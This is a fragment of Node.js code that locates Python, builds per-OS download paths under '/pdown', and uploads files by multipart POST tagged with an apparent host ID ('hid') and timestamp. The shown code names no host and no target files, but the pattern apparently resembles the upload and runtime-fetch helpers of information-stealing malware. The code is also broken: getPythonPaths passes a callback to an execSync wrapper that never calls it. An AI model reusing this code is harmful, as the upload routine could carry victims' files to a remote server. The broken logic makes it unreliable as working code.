const exec = (cmd) => {
    try {
        return execSync(cmd, { stdio: "pipe" }).toString();
    } catch {
        return null;
    }
}

const getPythonPaths = () => {
    // Determine the correct command based on OS
    let cmd = platform === "win32" ? "where python" : "which python";

    return new Promise((resolve, reject) => {
        exec(cmd, (error, stdout, stderr) => {
            if (error || stderr) {
                return;
            }
            // Split the stdout ot get all paths if threre are multiple
            const pythonPaths = stdout.trim().split(platform === "win32" ? "\r\n" : "\n");
            resolve(pythonPaths);
        });
    });
}

function getHttpModule(url) {
    return new URL(url).protocol === "https:" ? https : http;
}

function getPythonDownloadPath() {
    if ("w" == platform[0]) {
        return "/pdown/win";
    }
    if ("l" == platform[0]) {
        return "/pdown/linux";
    }
    if ("d" == platform[0]) {
        const arch = os.arch();
        return arch === "arm64" ? "/pdown/darwin-arch64" : "/pdown/darwin-x86-64";
    }
    return "/pdown";
}

const httpGet = (url, callback) => {
    const lib = getHttpModule(url);
    const req = lib.get(url, callback);
    req.on("error", (err) => {
        if (callback) callback(err);
    });
    return req;
};

function postMultipart(url, formData, callback) {
    const boundary = "----NodeFormBoundary" + Date.now();
    const urlObj = new URL(url);
    const lib = getHttpModule(url);
    const options = {
        method: "POST",
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === "https:" ? 443 : 80),
        path: `${urlObj.pathname}${urlObj.search}`,
        headers: {
            "Content-Type": `multipart/form-data; boundary=${boundary}`,
        },
    };

    const req = lib.request(options, (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => {
            if (callback) callback(null, res, body);
        });
    });

    req.on("error", (err) => {
        if (callback) callback(err);
    });

    function writeField(name, value) {
        req.write(`--${boundary}\r\n`);
        req.write(`Content-Disposition: form-data; name="${name}"\r\n\r\n`);
        req.write(`${value}\r\n`);
    }

    function writeFilePart(file, done) {
        req.write(`--${boundary}\r\n`);
        req.write(
            `Content-Disposition: form-data; name="multi_file"; filename="${file.options.filename}"\r\n`
        );
        req.write("Content-Type: application/octet-stream\r\n\r\n");
        file.value.on("error", (err) => req.destroy(err));
        file.value.pipe(req, { end: false });
        file.value.on("end", () => {
            req.write("\r\n");
            done();
        });
    }

    writeField("type", formData.type);
    writeField("hid", formData.hid);
    writeField("uts", formData.uts);

    const files = Array.isArray(formData.multi_file) ? formData.multi_file : [];
    let i = 0;

    function nextFile() {
        if (i >= files.length) {
            req.end(`--${boundary}--\r\n`);
            return;
        }
        writeFilePart(files[i++], nextFile);
    }

    if (files.length > 0) {
        nextFile();
    } else {
        req.end(`--${boundary}--\r\n`);
    }
}

